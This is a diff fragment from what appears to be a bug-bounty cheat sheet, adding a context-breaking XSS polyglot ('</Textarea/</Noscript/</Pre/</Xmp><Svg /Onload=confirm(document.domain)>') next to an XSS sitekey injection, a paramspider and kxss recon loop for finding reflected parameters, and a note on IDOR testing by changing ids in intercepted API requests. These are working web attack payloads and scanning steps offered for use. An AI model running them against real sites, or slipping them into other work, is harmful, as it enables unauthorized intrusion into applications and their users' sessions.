@@ -963,7 +963,7 @@ sitekey=";alert(0)//
 for url in 200_url.txt ; do (python3 paramspider.py -d "${url}");done
 cat filtered_url.txt | kxss	
 
-
+</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>
 ------------------------------------------------------------
 IDOR ::   API
   GO to my account and intercept data then change id 
